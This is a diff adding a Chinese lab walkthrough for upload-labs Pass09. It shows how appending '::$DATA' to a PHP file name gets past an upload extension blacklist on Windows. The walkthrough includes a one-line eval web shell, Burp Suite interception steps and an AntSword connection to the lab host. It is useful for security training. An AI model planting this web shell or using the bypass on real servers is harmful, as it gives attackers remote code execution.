@@ -769,3 +769,128 @@ ps: 蚁剑相关的文档查看对应的url:
 
 ## Pass09
 
+### 方法一
+
++ 首先看题目提示
+
+![Pass09_1](./img/Pass09_1.png)
+
+
+
++ 看源码，看到这一关黑名单没有对<code>::$DATA </code>进 行 处 理 使用<code>::$DATA</code> 进行处理，可以使用<code>::$DATA</code>绕过黑名单
+
+> 补充知识：<code>php</code>在<code>window</code>的时候如果文件名+<code>"::$DATA"</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>"::$DATA"</code>之前的文件名 
+
+![Pass09_2](./img/Pass09_2.png)
+
+
+
++ 编辑脚本<code>NinethFirstMethod.php</code>
+
+~~~ shell
+<?php phpinfo(); ?>
+~~~
+
+![Pass09_3](./img/Pass09_3.PNG)
+
+
+
++ 上传之前编辑的脚本<code>NinethFirstMethod.php</code>
+
+![Pass09_5](./img/Pass09_5.PNG)
+
+
+
++ 用<code>burpsuite</code>拦截并修改上传文件<code>NinethFirstMethod.php</code>的后缀为<code>NinethFirstMethod.php::$DATA</code>
+
+![Pass09_6](./img/Pass09_6.PNG)
+
+![Pass09_7](./img/Pass09_7.png)
+
+
+
++ 可以看到文件<code>NinethFirstMethod.php</code>上传成功
+
+![Pass09_8](./img/Pass09_8.png)
+
+
+
++ 右键打开文件
+
+![Pass09_9](./img/Pass09_9.png)
+
+
+
++ 可以看到脚本上传成功但没办法成功执行
+
+![Pass09_10](./img/Pass09_10.png)
+
+
+
+### 方法二
+
++ 编辑脚本<code>NinethSecondMethod.php</code>
+
+~~~ shell
+<?php @eval($_POST['NineSecond']); ?>
+~~~
+
+![Pass09_4](./img/Pass09_4.png)
+
+
+
++ 上传文件<code>NinethSecondMethod.php</code>
+
+![Pass09_11](./img/Pass09_11.PNG)
+
+
+
++ 用<code>burpsuite</code>拦截并修改上传文件<code>NinethSecondMethod.php</code>的后缀为<code>NinethSecondMethod.php::$DATA</code>
+
+![Pass09_12](./img/Pass09_12.png)
+
+![Pass09_13](./img/Pass09_13.png)
+
+
+
++ 可以看到文件<code>NinethSecondMethod.php</code>上传成功
+
+![Pass09_14](./img/Pass09_14.PNG)
+
+
+
++ 右键打开文件<code>NinethSecondMethod.php</code>
+
+![Pass09_15](./img/Pass09_15.png)
+
+
+
++ 复制打开文件<code>NinethSecondMethod.php</code>的网址
+
+~~~ shell
+http://192.168.0.102:8080/upload-labs/upload/202402050507382067.php::$data
+~~~
+
+![Pass09_16](./img/Pass09_16.png)
+
+
+
++ 打开蚁剑，配置相应的数据；<code>URL地址</code>填写上传文件的网址，<code>连接密码</code>根据脚本<code>NineSecondMethod.php</code>里的数据填写
+
+![Pass09_17](./img/Pass09_17.png)
+
+
+
++ 可看到，添加数据成功
+
+![Pass09_18](./img/Pass09_18.png)
+
+
+
++ 双击打开数据，<code>getshell</code>成功
+
+![Pass09_19](./img/Pass09_19.PNG)
+
+
+
+## Pass10
